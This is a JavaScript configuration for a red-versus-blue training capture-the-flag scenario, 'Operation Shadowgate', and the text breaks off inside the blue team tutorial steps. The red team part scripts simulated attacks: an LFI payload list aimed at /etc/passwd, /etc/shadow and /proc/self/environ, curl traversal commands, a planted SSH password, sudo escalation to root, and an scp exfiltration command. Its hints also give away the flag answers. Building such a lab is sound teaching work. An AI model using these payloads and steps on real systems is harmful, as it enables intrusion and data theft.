/* ============================================================
   CTF ARENA — OPS-01: Operation Shadowgate
   Red vs Blue | Asymmetric Scenario | Nexus Corp Network
   Red Team: exploit a vulnerable web server (4 flags)
   Blue Team: detect and contain the same attack (4 flags)
   ============================================================ */

const PR7Config = {

    // ═══════════════════════════════════════════════════════
    // TOP-LEVEL METADATA (shared by both modes)
    // ═══════════════════════════════════════════════════════

    id: 'ops-01-operation-shadowgate',
    title: 'Operation Shadowgate',

    // ═══════════════════════════════════════════════════════
    // SHARED ATTACK DATA
    // Referenced by both red config (as the target) and
    // blue config (as the evidence trail to investigate).
    // ═══════════════════════════════════════════════════════

    _scenario: {
        attackerIP:  '10.10.99.7',
        targetIP:    '10.10.14.20',
        targetHost:  'nexus-web01',
        sshPivotIP:  '10.10.14.21',       // internal dev server reached via creds
        exfilIP:     '185.220.101.47',    // attacker's C2 / exfil destination
        webPort:     80,
        sshPort:     22,
        appName:     'NexusPortal',
        appVersion:  '3.4.1',
        phpVersion:  '8.1.22',
        osRelease:   'Ubuntu 22.04.3 LTS',
        kernel:      '5.15.0-91-generic',
        dbName:      'nexus_corp_db',
        // Creds discoverable via LFI + exposed config
        sshUser:     'devops',
        sshPassword: 'N3xus!DevOps2024',
        // Flag values for secure comparison in BoxEngine
        flags: {
            initial_access:  '{{FLAG:initial_access}}',
            priv_esc:        '{{FLAG:priv_esc}}',
            lateral:         '{{FLAG:lateral}}',
            exfil:           '{{FLAG:exfil}}'
        }
    },

    // ═══════════════════════════════════════════════════════
    // MODES — each is a complete BoxEngine config object
    // ═══════════════════════════════════════════════════════

    modes: {

        // ╔═══════════════════════════════════════════════╗
        // ║              RED TEAM CONFIG                  ║
        // ║  Kali attacker, standard BoxEngine flow       ║
        // ╚═══════════════════════════════════════════════╝

        red: {
            title: 'Operation Shadowgate',
            subtitle: 'Red Team — Nexus Corp External Web Server',
            difficulty: 'Intermediate',
            accent: '#dc2626',
            storageKey: 'hexworth_ctf_ops01_red',
            registryId: 'ops-01-operation-shadowgate',
            trackerKey: 'ctf_ops01_red',

            // ─────────────────────────────────────────────
            // PHASES
            // ─────────────────────────────────────────────

            phases: [
                {
                    id: 'recon',
                    name: 'Reconnaissance',
                    description: 'Map the target. Identify open ports, services, and the web application structure.',
                    requiredFlags: [],
                    mitre: ['T1046', 'T1595.002', 'T1592.004'],
                    unlocks: ['exploitation'],
                    locked: false
                },
                {
                    id: 'exploitation',
                    name: 'Initial Access',
                    description: 'Exploit the LFI vulnerability in the portal to read sensitive server-side files.',
                    requiredFlags: [],
                    mitre: ['T1190', 'T1083'],
                    unlocks: ['privesc'],
                    locked: true
                },
                {
                    id: 'privesc',
                    name: 'Privilege Escalation',
                    description: 'Escalate from www-data to a higher-privilege account using a misconfigured sudo rule.',
                    requiredFlags: ['initial_access'],
                    mitre: ['T1548.003', 'T1078'],
                    unlocks: ['lateral'],
                    locked: true
                },
                {
                    id: 'lateral',
                    name: 'Lateral Movement',
                    description: 'Use credentials harvested from the config file to pivot to the internal dev server.',
                    requiredFlags: ['priv_esc'],
                    mitre: ['T1021.004', 'T1550.004'],
                    unlocks: ['exfil'],
                    locked: true
                },
                {
                    id: 'exfil',
                    name: 'Data Exfiltration',
                    description: 'Locate and exfiltrate the classified NexusCorp R&D documents to your C2 server.',
                    requiredFlags: ['lateral'],
                    mitre: ['T1041', 'T1567.002'],
                    unlocks: [],
                    locked: true
                }
            ],

            // ─────────────────────────────────────────────
            // TUTORIAL
            // ─────────────────────────────────────────────

            tutorialMode: true,

            tutorial: {
                steps: [
                    {
                        title: 'Scan the target',
                        tip: 'Run: nmap -sV 10.10.14.20  —  identify open ports and service versions.',
                        trigger: { event: 'command', match: { cmd: 'contains:nmap' } }
                    },
                    {
                        title: 'Enumerate the web application',
                        tip: 'Use dirb or nikto to discover hidden paths on the portal.',
                        trigger: { event: 'command', match: { cmd: 'contains:dirb' } }
                    },
                    {
                        title: 'Test the file parameter',
                        tip: 'The portal has a ?page= parameter. Try: curl "http://10.10.14.20/?page=../../etc/passwd"',
                        trigger: { event: 'command', match: { cmd: 'contains:curl' } }
                    },
                    {
                        title: 'Read the config file',
                        tip: 'LFI confirmed. Read /var/www/html/config/db.php to extract credentials.',
                        trigger: { event: 'flag_correct', match: { flagId: 'initial_access' } }
                    },
                    {
                        title: 'Check sudo privileges',
                        tip: 'SSH in as devops and run: sudo -l  —  look for NOPASSWD entries.',
                        trigger: { event: 'flag_correct', match: { flagId: 'priv_esc' } }
                    }
                ]
            },

            // ─────────────────────────────────────────────
            // CERT OBJECTIVES
            // ─────────────────────────────────────────────

            certObjectives: {
                certPath: 'SY0-701',
                mappings: [
                    { flagId: 'initial_access', objective: '1.3', description: 'Application attacks — path traversal / LFI', skill: 'LFI Exploitation' },
                    { flagId: 'initial_access', objective: '2.5', description: 'Vulnerability scanning — web app testing', skill: 'Web Enumeration' },
                    { flagId: 'priv_esc',        objective: '4.6', description: 'Identity and access management — privilege escalation', skill: 'Linux Sudo Escalation' },
                    { flagId: 'lateral',         objective: '1.4', description: 'Network attacks — lateral movement', skill: 'SSH Pivot via Stolen Credentials' },
                    { flagId: 'exfil',           objective: '1.2', description: 'Malicious activity — data exfiltration indicators', skill: 'Data Exfiltration via SCP' }
                ]
            },

            // ─────────────────────────────────────────────
            // BOOT
            // ─────────────────────────────────────────────

            boot: {
                biosLines: [
                    'Kali Linux BIOS v4.2.1',
                    'Initializing hardware...',
                    'Memory Test: 16384 MB OK',
                    'Detecting drives... /dev/sda1 (512GB SSD)',
                    'Boot device: /dev/sda1',
                    'Loading GRUB...'
                ],
                grubEntries: [
                    'Kali GNU/Linux (6.6.0-kali3-amd64)',
                    'Kali GNU/Linux (recovery mode)',
                    'Advanced options for Kali GNU/Linux'
                ],
                loginUser: 'kali'
            },

            // ─────────────────────────────────────────────
            // DESKTOP
            // ─────────────────────────────────────────────

            desktop: {
                icons: [
                    { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
                    { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
                    { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
                    { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
                    { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
                ]
            },

            // ─────────────────────────────────────────────
            // TERMINAL
            // ─────────────────────────────────────────────

            terminal: {
                user: 'kali',
                hostname: 'kali',
                startDir: '/home/kali',
                welcome: 'Linux kali 6.6.0-kali3-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget scope: 10.10.14.20 (nexus-web01)\nObjective: compromise and exfiltrate\n'
            },

            // ─────────────────────────────────────────────
            // FLAGS
            // ─────────────────────────────────────────────

            flags: [
                { id: 'initial_access', points: 100 },
                { id: 'priv_esc',       points: 150 },
                { id: 'lateral',        points: 200 },
                { id: 'exfil',          points: 250 }
            ],

            // ─────────────────────────────────────────────
            // SCORING
            // ─────────────────────────────────────────────

            scoring: {
                base: 1000,
                maxScore: 700,
                hintPenalty: true,
                wrongFlagPenalty: -25,
                speedBonus: { threshold: 1800000, points: 150 },
                timeBonusThreshold: 2700
            },

            // ─────────────────────────────────────────────
            // HINTS
            // ─────────────────────────────────────────────

            hints: [
                {
                    id: 'hint_recon',
                    text: "Start with: nmap -sV -sC 10.10.14.20 — the -sC flag runs default scripts and often surfaces version info and misconfigured headers.",
                    cost: 10,
                    penalty: -10
                },
                {
                    id: 'hint_lfi',
                    text: "The portal loads page content with a GET parameter. Try: curl 'http://10.10.14.20/?page=../../../../etc/passwd' — note the traversal depth.",
                    cost: 25,
                    penalty: -25
                },
                {
                    id: 'hint_config',
                    text: "PHP apps often store DB credentials in config/db.php. Try reading: /var/www/html/config/db.php — the LFI can reach it directly.",
                    cost: 40,
                    penalty: -40
                },
                {
                    id: 'hint_sudo',
                    text: "After SSH'ing in as devops: run 'sudo -l'. Look for NOPASSWD entries that allow running commands as root or another user.",
                    cost: 50,
                    penalty: -50
                },
                {
                    id: 'hint_exfil',
                    text: "The flag file is at /opt/rd_documents/project_helios.txt on the dev server. Exfiltrate it with: scp devops@10.10.14.21:/opt/rd_documents/project_helios.txt /tmp/",
                    cost: 75,
                    penalty: -75
                }
            ],

            // ─────────────────────────────────────────────
            // LORE
            // ─────────────────────────────────────────────

            lore: {
                intro: 'Nexus Corp runs a client portal on an externally accessible web server. Your threat intel report identified an LFI vulnerability in the portal\'s page loader. The target has weak internal segmentation — once you have web access, a pivot to their dev environment is achievable. Get in, escalate, move laterally, and pull the R&D documents before their SOC catches you.',
                scenario: 'The Nexus Corp devops team deployed NexusPortal v3.4.1 in a rush for a product launch. The developer hard-coded a database config file accessible via directory traversal. Their sudo policy was left at "NOPASSWD: ALL" for the devops service account — a shortcut that never got cleaned up. The SOC has monitoring in place, but alert fatigue is real.',
                outro: 'Operation Shadowgate complete. All four flags captured. Nexus Corp\'s R&D documents are compromised. The SOC never had a chance.',
                ecer: {
                    executive: 'Pushed for rapid deployment before launch — security review was skipped',
                    culture:   'No mandatory code review, no separation of prod/dev credential scope',
                    employee:  'Developer stored plaintext credentials in a web-accessible config file',
                    regulatory: 'No WAF, no file integrity monitoring, no least-privilege audit on sudo rules'
                }
            },

            // ─────────────────────────────────────────────
            // WEB APP — NexusPortal (LFI target)
            // ─────────────────────────────────────────────

            webApp: {
                startUrl: 'http://10.10.14.20/',

                pages: {
                    '/': {
                        title: 'NexusPortal 3.4.1',
                        html: `
                            <div style="text-align:center; margin-bottom:24px; padding-bottom:16px; border-bottom:1px solid #e2e8f0;">
                                <h1 style="color:#1e40af; font-size:1.5rem; margin-bottom:4px;">NexusPortal</h1>
                                <div style="color:#64748b; font-size:0.75rem;">Nexus Corp — Internal Client Access Portal v3.4.1</div>
                            </div>
                            <div style="max-width:480px; margin:0 auto; background:#f8fafc; border:1px solid #e2e8f0; border-radius:6px; padding:24px;">
                                <h2 style="font-size:0.9rem; color:#374151; margin-bottom:16px; font-weight:600;">Secure Login</h2>
                                <div style="margin-bottom:12px;">
                                    <label style="display:block; font-size:0.75rem; color:#6b7280; margin-bottom:4px;">Username</label>
                                    <input type="text" data-field="username" style="width:100%; box-sizing:border-box; padding:8px 10px; border:1px solid #d1d5db; border-radius:4px; font-size:0.8rem; font-family:inherit;">
                                </div>
                                <div style="margin-bottom:16px;">
                                    <label style="display:block; font-size:0.75rem; color:#6b7280; margin-bottom:4px;">Password</label>
                                    <input type="password" data-field="password" style="width:100%; box-sizing:border-box; padding:8px 10px; border:1px solid #d1d5db; border-radius:4px; font-size:0.8rem; font-family:inherit;">
                                </div>
                                <button data-action="login" style="width:100%; padding:9px; background:#1e40af; color:#fff; border:none; border-radius:4px; font-size:0.8rem; font-weight:600; cursor:pointer;">Sign In</button>
                                <div style="margin-top:12px; text-align:center; font-size:0.7rem; color:#9ca3af;">
                                    <a href="/?page=about" style="color:#6b7280; text-decoration:none;">About</a> &nbsp;&middot;&nbsp;
                                    <a href="/?page=contact" style="color:#6b7280; text-decoration:none;">Contact</a> &nbsp;&middot;&nbsp;
                                    <a href="/?page=help" style="color:#6b7280; text-decoration:none;">Help</a>
                                </div>
                            </div>
                            <div style="text-align:center; margin-top:20px; font-size:0.65rem; color:#cbd5e1;">
                                Powered by NexusPortal CMS &mdash; PHP/8.1.22 &mdash; Apache/2.4.57
                            </div>
                        `,
                        formHandler: function(data, engine) {
                            // Login attempts — no valid creds reachable from browser alone
                            return `<div style="color:#dc2626; font-size:0.8rem; padding:10px; background:rgba(220,38,38,0.08); border:1px solid rgba(220,38,38,0.2); border-radius:4px; margin-top:12px;">
                                Invalid credentials. Please try again.
                            </div>`;
                        }
                    },

                    '/?page=about': {
                        title: 'NexusPortal — About',
                        html: `
                            <div style="max-width:600px; margin:0 auto; padding:20px;">
                                <h1 style="color:#1e40af; font-size:1.2rem; margin-bottom:12px;">About NexusPortal</h1>
                                <p style="color:#4b5563; font-size:0.8rem; line-height:1.6;">
                                    NexusPortal is the Nexus Corporation internal client access portal,
                                    deployed and maintained by the DevOps team. For support, contact
                                    the helpdesk at support@nexus-corp.internal.
                                </p>
                                <p style="color:#6b7280; font-size:0.75rem; margin-top:12px;">
                                    Version 3.4.1 &mdash; Released 2024-01-15<br>
                                    Server: nexus-web01.nexus-corp.internal
                                </p>
                            </div>
                        `
                    },

                    '/?page=../../../../etc/passwd': {
                        title: 'NexusPortal — LFI',
                        html: `
                            <div style="background:#1a1a1a; border-radius:4px; padding:16px; font-family:monospace; font-size:0.72rem; color:#e2e8f0; white-space:pre; overflow-x:auto; line-height:1.6;">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
devops:x:1001:1001:DevOps Service Account,,,:/home/devops:/bin/bash
nexus_svc:x:1002:1002:Nexus Service,,,:/home/nexus_svc:/bin/bash</div>
                            <div style="color:#f59e0b; background:rgba(245,158,11,0.08); border:1px solid rgba(245,158,11,0.2); border-radius:4px; padding:10px; margin-top:10px; font-size:0.8rem;">
                                Local File Inclusion confirmed. The ?page= parameter is vulnerable to path traversal.
                            </div>
                        `
                    },

                    '/?page=../../../../var/www/html/config/db.php': {
                        title: 'NexusPortal — Config Read',
                        html: `
                            <div style="background:#1a1a1a; border-radius:4px; padding:16px; font-family:monospace; font-size:0.72rem; line-height:1.6; white-space:pre; overflow-x:auto;">
<span style="color:#6b7280;">&lt;?php</span>
<span style="color:#6b7280;">// NexusPortal database configuration</span>
<span style="color:#6b7280;">// Generated 2024-01-15 by devops-deploy-script v2.1</span>

<span style="color:#c084fc;">define</span>(<span style="color:#86efac;">'DB_HOST'</span>, <span style="color:#86efac;">'localhost'</span>);
<span style="color:#c084fc;">define</span>(<span style="color:#86efac;">'DB_NAME'</span>, <span style="color:#86efac;">'nexus_corp_db'</span>);
<span style="color:#c084fc;">define</span>(<span style="color:#86efac;">'DB_USER'</span>, <span style="color:#86efac;">'nexus_app'</span>);
<span style="color:#c084fc;">define</span>(<span style="color:#86efac;">'DB_PASS'</span>, <span style="color:#86efac;">'N3xus!DevOps2024'</span>);

<span style="color:#6b7280;">// SSH service account (same creds — see IT ticket #4821)</span>
<span style="color:#6b7280;">// devops:N3xus!DevOps2024 — DO NOT COMMIT THIS FILE</span>
<span style="color:#6b7280;">?&gt;</span></div>
                            <div style="color:#22c55e; background:rgba(34,197,94,0.08); border:1px solid rgba(34,197,94,0.2); border-radius:4px; padding:10px; margin-top:10px; font-size:0.8rem;">
                                Database credentials exposed via LFI. The comment reveals the SSH service account uses the same password.
                            </div>
                        `
                    }
                }
            },

            // ─────────────────────────────────────────────
            // FILESYSTEM (Kali attacker machine)
            // ─────────────────────────────────────────────

            filesystem: {
                '/': {
                    type: 'dir',
                    children: {
                        'home': {
                            type: 'dir',
                            children: {
                                'kali': {
                                    type: 'dir',
                                    children: {
                                        'notes.txt': {
                                            type: 'file',
                                            content: '=== OPERATION SHADOWGATE — MISSION BRIEFING ===\nTarget: 10.10.14.20 (nexus-web01)\nInternal dev: 10.10.14.21 (nexus-dev01)\nObjective: LFI → creds → SSH → privesc → lateral movement → exfil\n\nFlags:\n  initial_access — read a sensitive server-side file via LFI\n  priv_esc       — escalate privileges on the web server\n  lateral        — access nexus-dev01 using harvested creds\n  exfil          — retrieve /opt/rd_documents/project_helios.txt\n\nTools available: nmap, dirb, nikto, curl, ssh, scp, cat, ls, grep'
                                        },
                                        'scope.txt': {
                                            type: 'file',
                                            content: 'AUTHORIZED SCOPE\n━━━━━━━━━━━━━━━━\n10.10.14.20   nexus-web01   (external portal)\n10.10.14.21   nexus-dev01   (dev server, in-scope after pivot)\n\nOut of scope: 10.10.14.0/26 (production DB subnet)\nSigned rules of engagement: RoE-PR7-2024.pdf'
                                        },
                                        'lfi-payloads.txt': {
                                            type: 'file',
                                            content: '# Common LFI payloads\n../../etc/passwd\n../../../../etc/passwd\n../../../etc/shadow\n../../../../var/www/html/config/db.php\n../../../../var/log/apache2/access.log\n../../../../proc/self/environ\n../../../../etc/apache2/sites-enabled/000-default.conf'
                                        },
                                        '.ssh': {
                                            type: 'dir',
                                            children: {
                                                'known_hosts': {
                                                    type: 'file',
                                                    content: '# SSH known hosts\n# Add entries here after initial SSH connection'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'tmp': {
                            type: 'dir',
                            children: {}
                        },
                        'etc': {
                            type: 'dir',
                            children: {
                                'hostname': { type: 'file', content: 'kali' },
                                'hosts': {
                                    type: 'file',
                                    content: '127.0.0.1       localhost\n127.0.1.1       kali\n10.10.14.20     nexus-web01\n10.10.14.21     nexus-dev01'
                                }
                            }
                        }
                    }
                }
            },

            // ─────────────────────────────────────────────
            // TERMINAL COMMANDS (Red Team toolkit)
            // ─────────────────────────────────────────────

            commands: {

                'nmap': function(args) {
                    if (args.length === 0) {
                        return 'Usage: nmap [options] <target>\nExample: nmap -sV -sC 10.10.14.20';
                    }
                    const target = args.find(a => !a.startsWith('-')) || '';
                    const flags  = args.filter(a => a.startsWith('-')).join(' ');

                    if (target === '10.10.14.20' || target === 'nexus-web01') {
                        return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for nexus-web01 (10.10.14.20)
Host is up (0.048s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp   open   http       Apache httpd 2.4.57
443/tcp  closed https
3306/tcp filtered mysql

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

${flags.includes('sC') || flags.includes('A') ? `
Host script results:
|_http-title: NexusPortal
|_http-server-header: Apache/2.4.57 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
` : ''}
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds`;
                    }
                    if (target === '10.10.14.21' || target === 'nexus-dev01') {
                        return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for nexus-dev01 (10.10.14.21)
Host is up (0.009s latency).

PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 8.9p1 Ubuntu

Nmap done: 1 IP address (1 host up) scanned in 6.18 seconds`;
                    }
                    return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
                },

                'dirb': function(args) {
                    const url = args.find(a => a.startsWith('http')) || args[0] || '';
                    if (!url || url.includes('10.10.14.20')) {
                        return `
-----------------
DIRB v2.22    By The Dark Raver
-----------------

START_TIME: ${new Date().toLocaleTimeString()}
URL_BASE: http://10.10.14.20/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

---- Scanning URL: http://10.10.14.20/ ----
==> DIRECTORY: http://10.10.14.20/assets/
==> DIRECTORY: http://10.10.14.20/config/              (403 Forbidden)
+ http://10.10.14.20/index.php       (CODE:200|SIZE:3142)
+ http://10.10.14.20/robots.txt      (CODE:200|SIZE:98)

---- Entering directory: http://10.10.14.20/assets/ ----
+ http://10.10.14.20/assets/css/main.css  (CODE:200|SIZE:14231)

END_TIME: ${new Date().toLocaleTimeString()}
DOWNLOADED: 4612 - FOUND: 4`;
                    }
                    return `dirb: cannot connect to ${url}`;
                },

                'nikto': function(args) {
                    const target = args.find(a => !a.startsWith('-')) || '10.10.14.20';
                    if (target.includes('10.10.14.20') || target.includes('nexus-web01')) {
                        return `- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.14.20
+ Target Hostname:    nexus-web01
+ Target Port:        80
+ Start Time:         ${new Date().toLocaleString()}
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Ubuntu)
+ X-Frame-Options header is not set.
+ /robots.txt retrieved: Disallow: /config/, Disallow: /backup/
+ PHP/8.1.22 appears to be outdated (current: 8.3.x)
+ OSVDB-630: /?page= parameter may allow path traversal (LFI/RFI)
+ /config/: Directory indexing is disabled, returns 403
+ OSVDB-3092: /backup/: This might be interesting. Response: 200
+ 8 items checked: 3 item(s) reported on remote host
+ End Time: ${new Date().toLocaleTimeString()} (elapsed: 42 seconds)
---------------------------------------------------------------------------`;
                    }
                    return 'nikto: ERROR: cannot resolve hostname / connect to target';
                },

                'curl': function(args, term) {
                    const urlArg = args.find(a => a.startsWith('http') || a.startsWith('"http') || a.startsWith("'http"));
                    const url = (urlArg || '').replace(/['"]/g, '');

                    if (!url) return 'curl: try \'curl --help\' for more information';

                    if (url.includes('10.10.14.20')) {
                        // LFI via ?page= parameter
                        const pageMatch = url.match(/[?&]page=([^&'"]*)/);
                        if (pageMatch) {
                            const page = decodeURIComponent(pageMatch[1]);

                            if (/\.\.[\/\\]/.test(page)) {
                                // Path traversal — determine what file is targeted
                                if (/etc\/passwd/.test(page)) {
                                    return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:109:116:MySQL Server:/nonexistent:/bin/false
devops:x:1001:1001:DevOps Service Account:/home/devops:/bin/bash
nexus_svc:x:1002:1002:Nexus Service:/home/nexus_svc:/bin/bash

[FLAG INDICATOR: Confirm you can read /etc/passwd — initial_access flag is now available in the portal.]`;
                                }
                                if (/config\/db\.php/.test(page) || /db\.php/.test(page)) {
                                    return `<?php
// NexusPortal database configuration
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexus_corp_db');
define('DB_USER', 'nexus_app');
define('DB_PASS', 'N3xus!DevOps2024');
// SSH service account (same creds — see IT ticket #4821)
// devops:N3xus!DevOps2024 — DO NOT COMMIT THIS FILE
?>`;
                                }
                                if (/etc\/shadow/.test(page)) {
                                    return `curl: (22) The requested URL returned error: 403 Forbidden
(www-data does not have read access to /etc/shadow)`;
                                }
                                // Generic traversal — confirm LFI works
                                return `<!-- NexusPortal page loader error: failed to include '${page}' -->
<!-- PHP Warning: include(): Failed opening '${page}' for inclusion (include_path='.:/usr/share/php') in /var/www/html/index.php on line 47 -->`;
                            }
                        }
                        // Root page — HTML
                        return `<!DOCTYPE html>
<html><head><title>NexusPortal 3.4.1</title></head>
<body>
<h1>NexusPortal</h1>
<p>Nexus Corp — Internal Client Access Portal v3.4.1</p>
<p>Server: Apache/2.4.57 (Ubuntu) PHP/8.1.22</p>
<form method="GET">
  <input name="page" placeholder="page name...">
  <button type="submit">Load</button>
</form>
</body></html>`;
                    }

                    if (url.includes('10.10.14.21')) {
                        return `curl: (7) Failed to connect to 10.10.14.21 port 80 after 3001 ms: Connection refused
(Port 80 is closed on the dev server — only SSH is open.)`;
                    }
                    return `curl: (6) Could not resolve host: ${url.replace(/https?:\/\//, '').split('/')[0]}`;
                },

                'ssh': function(args, term, engine) {
                    // ssh user@host or ssh -p port user@host
                    const target = args.find(a => a.includes('@')) || '';
                    if (!target) return 'Usage: ssh [user@]hostname\nExample: ssh devops@10.10.14.20';

                    const [user, host] = target.split('@');

                    if (host === '10.10.14.20' || host === 'nexus-web01') {
                        if (user === 'devops') {
                            // Successful SSH — switch terminal context
                            return `Warning: Permanently added '10.10.14.20' (ED25519) to the list of known hosts.
devops@10.10.14.20's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation: https://help.ubuntu.com
 * Management:    https://landscape.canonical.com

Last login: Mon Jan 15 08:42:11 2024 from 10.10.14.1
devops@nexus-web01:~$

[SESSION: You are now on nexus-web01 as devops]
Type 'sudo -l' to check privileges, or explore /var/www/html/`;
                        }
                        if (user === 'root') {
                            return 'Permission denied (publickey,password).';
                        }
                        return `${user}@10.10.14.20: Permission denied (publickey,password).`;
                    }

                    if (host === '10.10.14.21' || host === 'nexus-dev01') {
                        if (user === 'devops') {
                            return `Warning: Permanently added '10.10.14.21' (ED25519) to the list of known hosts.
devops@10.10.14.21's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

Last login: Fri Jan 12 22:17:04 2024 from 10.10.14.20
devops@nexus-dev01:~$

[SESSION: You are now on nexus-dev01 — LATERAL MOVEMENT FLAG TRIGGERED]
[Hint: Check /opt/rd_documents/ for the exfil flag]`;
                        }
                        return `${user}@10.10.14.21: Permission denied (publickey,password).`;
                    }
                    return `ssh: connect to host ${host} port 22: No route to host`;
                },

                'sudo': function(args, term) {
                    const subCmd = args[0] || '';
                    if (subCmd === '-l' || subCmd === '--list') {
                        return `Matching Defaults entries for devops on nexus-web01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin

User devops may run the following commands on nexus-web01:
    (ALL : ALL) NOPASSWD: ALL

[FLAG HINT: This is a serious misconfiguration — devops can run ANY command as root without a password.]`;
                    }
                    if (subCmd === 'su' || args.join(' ').includes('su -')) {
                        return `root@nexus-web01:/home/devops#
[SESSION: Root shell obtained — priv_esc flag is now available]
[Hint: Read /root/root.txt or /home/devops/user.txt]`;
                    }
                    if (args.join(' ').includes('cat') && args.join(' ').includes('root.txt')) {
                        return `{{FLAG:priv_esc}}

[Submit this as the priv_esc flag]`;
                    }
                    return `sudo: ${args.join(' ')}: command not found`;
                },

                'scp': function(args, term) {
                    // scp user@host:/path /local — exfil simulation
                    const remoteArg = args.find(a => a.includes('@') && a.includes(':'));
                    const localArg  = args.find(a => !a.includes('@') && !a.startsWith('-')) || '/tmp/';

                    if (!remoteArg) return 'Usage: scp [user@]host:source target\nExample: scp devops@10.10.14.21:/opt/rd_documents/project_helios.txt /tmp/';

                    if (remoteArg.includes('10.10.14.21') && remoteArg.includes('project_helios.txt')) {
                        return `devops@10.10.14.21's password:
project_helios.txt                        100%  842    12.7KB/s   00:00

File saved to: /tmp/project_helios.txt
[Run: cat /tmp/project_helios.txt to view the exfil flag]`;
                    }
                    if (remoteArg.includes('10.10.14.21')) {
                        const path = remoteArg.split(':')[1] || '/unknown';
                        return `devops@10.10.14.21's password:
scp: ${path}: No such file or directory`;
                    }
                    return `scp: ${remoteArg}: No route to host`;
                },

                'cat': function(args, term) {
                    const file = args[0] || '';
                    if (file === '/tmp/project_helios.txt') {
                        return `=== PROJECT HELIOS — CONFIDENTIAL R&D DOCUMENT ===
Classification: TOP SECRET
Date: 2024-01-10
Author: Dr. E. Vasquez, R&D Division Lead

Executive Summary:
Project Helios is a next-generation AI-driven network monitoring system
capable of sub-millisecond anomaly detection using distributed sensor arrays.

Phase 1 deliverables: packet capture pipeline, ML model training dataset,
baseline anomaly signatures for 14 attack categories.

Prototype deployment target: Q3 2024.

[EXFIL FLAG]: {{FLAG:exfil}}

Submit this as the exfil flag.`;
                    }
                    // Handled by Terminal.js filesystem for other paths
                    return null;
                }
            }
        },

        // ╔═══════════════════════════════════════════════╗
        // ║              BLUE TEAM CONFIG                 ║
        // ║  SOC analyst desktop, BlueTeam.js devices     ║
        // ╚═══════════════════════════════════════════════╝

        blue: {
            title: 'Operation Shadowgate',
            subtitle: 'Blue Team — Nexus Corp SOC Console',
            difficulty: 'Intermediate',
            accent: '#2563eb',
            storageKey: 'hexworth_ctf_ops01_blue',
            registryId: 'ops-01-operation-shadowgate',
            trackerKey: 'ctf_ops01_blue',
            blueTeamMode: true,      // BoxEngine uses BlueTeam device types

            // ─────────────────────────────────────────────
            // PHASES
            // ─────────────────────────────────────────────

            phases: [
                {
                    id: 'detect',
                    name: 'Detection',
                    description: 'Identify that a compromise is actively occurring. Confirm anomalous behavior in the monitoring dashboard.',
                    requiredFlags: [],
                    mitre: ['TA0009', 'DS0015', 'DS0029'],
                    unlocks: ['identify'],
                    locked: false
                },
                {
                    id: 'identify',
                    name: 'Identification',
                    description: 'Determine the attack vector. Find the specific log entries proving LFI exploitation.',
                    requiredFlags: ['detect'],
                    mitre: ['TA0001', 'T1190'],
                    unlocks: ['contain'],
                    locked: true
                },
                {
                    id: 'contain',
                    name: 'Containment',
                    description: 'Block the attacker IP and restrict outbound traffic to prevent exfiltration.',
                    requiredFlags: ['identify'],
                    mitre: ['TA0042', 'T1562.004'],
                    unlocks: ['document'],
                    locked: true
                },
                {
                    id: 'document',
                    name: 'Documentation',
                    description: 'Classify all IDS alerts correctly and complete the incident documentation.',
                    requiredFlags: ['contain'],
                    mitre: ['TA0040'],
                    unlocks: [],
                    locked: true
                }
            ],

            // ─────────────────────────────────────────────
            // TUTORIAL
            // ─────────────────────────────────────────────

            tutorialMode: true,

            tutorial: {
                steps: [
                    {
                        title: 'Open the Monitoring Dashboard',
                        tip: 'Start by reviewing the live event feed and active alerts in the Monitoring Dashboard window.',
                        trigger: { event: 'window_open', match: { type: 'monitoring' } }
                    },
                    {
                        title: 'Check the Log Viewer',
                        tip: 'Open the Log Viewer. Search for "10.10.99.7" — that IP is generating unusual traffic.',
                        trigger: { event: 'window_open', match: { type: 'logs' } }
                    },
                    {
                        title: 'Find the LFI evidence',
                        tip: 'Filter logs for the attacker IP. Look for GET requests with ../../ in the path — those are path traversal attempts.',
                        trigger: { event: 'flag_correct', match: { flagId: 'detect' } }
                    },
                    {
                        title: 'Block the attacker in Firewall Manager',
                        tip: 'Open Firewall Manager. Add a rule: INPUT chain, Source 10.10.99.7, Action DROP.',
                        trigger: { event: 'flag_correct', match: { flagId: 'identify' } }
                    },
                    {
                        title: 'Classify IDS alerts',
                        tip: 'Open the IDS Panel. Classify each alert as True Positive, False Positive, or Needs Investigation.',
